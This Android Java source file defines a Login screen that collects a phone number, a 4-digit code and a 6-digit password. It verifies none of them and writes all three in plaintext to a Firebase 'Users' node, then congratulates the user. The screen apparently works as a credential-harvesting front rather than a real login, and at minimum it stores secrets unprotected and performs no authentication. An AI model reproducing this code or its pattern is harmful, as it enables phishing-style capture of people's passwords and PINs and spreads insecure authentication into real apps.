package com.kim.siwezi;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.kim.siwezi.R;


import java.util.HashMap;

public class Login extends AppCompatActivity {
    EditText number,code,pass;
    Button login;
    String num,co,pa;
    private ProgressDialog loadingBar;


FirebaseDatabase db;
    DatabaseReference mDatabase;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        loadingBar=new ProgressDialog(Login.this);
        loadingBar.setTitle("Analysing bot");
        loadingBar.setMessage("Processing....");
        mDatabase=FirebaseDatabase.getInstance().getReference();



        number=findViewById(R.id.foneid);
        code=findViewById(R.id.accescode);
        pass=findViewById(R.id.passid);
        login=findViewById(R.id.idbtn);
        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                getDetails();
            }
        });
    }

    private void getDetails() {
        num=number.getText().toString().trim();
        co=code.getText().toString().trim();
        pa=pass.getText().toString().trim();
        if (num.isEmpty() || co.isEmpty() || pa.isEmpty())
        {
            Toast.makeText(this, "Fill all the details", Toast.LENGTH_SHORT).show();

           return;
        }
        if (pa.length() > 6 || pa.length() <6) {
            Toast.makeText(getApplicationContext(), "password should contain 6 digits", Toast.LENGTH_SHORT).show();


            return;
        }
        if (co.length() > 4 || co.length() < 4) {
            Toast.makeText(getApplicationContext(), "code should contain 4 digits", Toast.LENGTH_SHORT).show();


            return;
        }
       mDatabase.addValueEventListener(new ValueEventListener() {
           @Override
           public void onDataChange(@NonNull DataSnapshot snapshot) {
               loadingBar.show();


               HashMap<String, Object> userdataMap = new HashMap<>();
               userdataMap.put("phone",num);
               userdataMap.put("password", pa);
               userdataMap.put("code",co);

               mDatabase.child("Users").child(num).updateChildren(userdataMap)
                       .addOnCompleteListener(new OnCompleteListener<Void>() {
                           @Override
                           public void onComplete(@NonNull Task<Void> task)
                           {
                               if (task.isSuccessful())
                               {
                                   Toast.makeText(Login.this, "Congratulations!", Toast.LENGTH_SHORT).show();
                                   loadingBar.dismiss();

                                   Intent intent = new Intent(Login.this,SecondActivity.class);
                                   startActivity(intent);
                               }
                               else
                               {
                                   loadingBar.dismiss();
                                   Toast.makeText(Login.this, "Network Error: Please try again after some time...", Toast.LENGTH_SHORT).show();
                               }
                           }
                       });


           }

           @Override
           public void onCancelled(@NonNull DatabaseError error) {

           }
       });


        }
    }



